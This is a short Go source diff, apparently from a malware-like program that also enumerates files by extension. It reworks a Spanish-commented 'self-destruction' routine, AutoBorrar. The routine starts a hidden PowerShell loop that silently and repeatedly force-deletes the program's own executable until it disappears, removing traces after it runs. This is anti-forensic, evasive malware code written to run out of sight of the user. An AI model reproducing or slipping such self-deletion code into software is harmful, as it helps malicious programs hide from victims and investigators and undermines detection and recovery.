@@ -67,11 +67,9 @@ func ListFiles(root string, extensions []string) ([]string, error) {
 //parte opcional: autodestruccion
 func AutoBorrar() {
 	ruta, _ := filepath.Abs(os.Args[0])
-	os.Rename(ruta, ruta+".tmp")
 
-	//un powershell oculto reintenta el borrado hasta que el proceso muere
 	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
-		"while($true){ Remove-Item '"+ruta+".tmp' -Force -ErrorAction SilentlyContinue; if(-not (Test-Path '"+ruta+".tmp')){break}; Start-Sleep 2 }")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //sin ventana
+		"while($true){ Remove-Item '"+ruta+"' -Force -ErrorAction SilentlyContinue; if(-not (Test-Path '"+ruta+"')){break}; Start-Sleep 2 }")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Start()
 }
